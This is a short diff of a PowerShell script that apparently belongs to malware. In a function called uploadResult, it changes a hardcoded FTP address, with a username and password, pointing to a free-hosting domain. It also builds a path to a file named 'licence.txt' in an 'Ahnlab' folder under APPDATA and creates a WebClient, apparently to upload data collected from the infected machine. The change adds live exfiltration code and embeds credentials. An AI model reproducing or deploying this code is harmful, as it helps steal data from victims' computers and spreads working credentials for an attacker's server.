@@ -20,7 +20,7 @@ Function getinfo
 function uploadResult
 {
 	
-	$ftpuri = "ftp://4189157:XmdDv4T6enkizfUYKHs@sussthanks.sportsontheweb.net/sussthanks.sportsontheweb.net/"
+	$ftpuri = "ftp://4209698:XmdDv4T6enkizfU@sussthanks.sportsontheweb.net/sussthanks.sportsontheweb.net/"
 
 	$upfilepath = $env:APPDATA + "\Ahnlab\licence.txt"
 	$webclient = New-Object System.Net.WebClient
